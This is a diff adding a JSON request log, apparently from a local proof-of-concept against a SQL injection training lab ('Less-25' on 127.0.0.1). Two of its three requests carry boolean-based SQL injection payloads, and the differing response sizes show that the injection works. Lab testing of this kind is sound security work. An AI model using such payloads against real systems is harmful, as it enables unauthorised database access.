@@ -1,0 +1,65 @@
+[
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9081/Less-25/index.php?id=1",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9081",
+      "Connection": "close",
+      "X-Powered-By": "PHP/5.6.40",
+      "Content-type": "text/html; charset=UTF-8"
+    },
+    "response_bytes": 892,
+    "response_sha256": "1d73e99228ea8e1c1bdea2da576f97504bea7036d990b0b020be6db3b546e4f3",
+    "started_at": "2026-10-19T14:07:28+08:00"
+  },
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9081/Less-25/index.php?id=1%27%20%26%26%20%271%27%3D%271",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9081",
+      "Connection": "close",
+      "X-Powered-By": "PHP/5.6.40",
+      "Content-type": "text/html; charset=UTF-8"
+    },
+    "response_bytes": 903,
+    "response_sha256": "a0f6881460b607b37dcada9a55c92b42414fc47cf493b53720b4e1135348d430",
+    "started_at": "2026-10-19T14:07:28+08:00"
+  },
+  {
+    "method": "GET",
+    "url": "http://127.0.0.1:9081/Less-25/index.php?id=1%27%20%26%26%20%271%27%3D%272",
+    "request_headers": {
+      "User-Agent": "wp4-local-poc/1.0",
+      "Accept": "*/*"
+    },
+    "cookie_names": [],
+    "body": null,
+    "body_sha256": null,
+    "status": 200,
+    "response_headers": {
+      "Host": "127.0.0.1:9081",
+      "Connection": "close",
+      "X-Powered-By": "PHP/5.6.40",
+      "Content-type": "text/html; charset=UTF-8"
+    },
+    "response_bytes": 852,
+    "response_sha256": "06fa71b88c232af4db5d0bd9200d49edeac522a246e836ece1b7e83c0e2704d4",
+    "started_at": "2026-10-19T14:07:28+08:00"
+  }
+]
